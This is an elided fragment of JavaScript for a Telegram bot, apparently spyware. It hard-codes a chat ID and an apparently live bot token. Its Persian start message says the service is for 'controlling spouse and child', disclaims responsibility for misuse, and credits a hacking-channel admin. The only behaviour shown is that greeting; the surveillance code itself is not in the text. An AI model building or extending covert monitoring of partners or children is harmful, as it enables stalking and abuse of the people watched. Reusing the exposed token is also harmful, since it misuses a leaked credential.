...
const chatId = '5916779499'
const token = '8313839252:AAGec9bgEiLsJtQ3Hhgz0Tyuz-uOv0mnzAM'
...
bot.on("message", (msg) => {
    if (msg.text === '/start') {
        bot.sendMessage(chatId, "با سلام خدمت دوست عزیز این سرویس صرفا جهت کنترل همسر و فرزند ارائه میشود و هرگونه استفاده ناصحیح بر عهده شخص استفاده کننده ست  ارائه شده توسط مدیر کانال آموزش هک و امنیت ( @KINGOF_Hack0098 )",
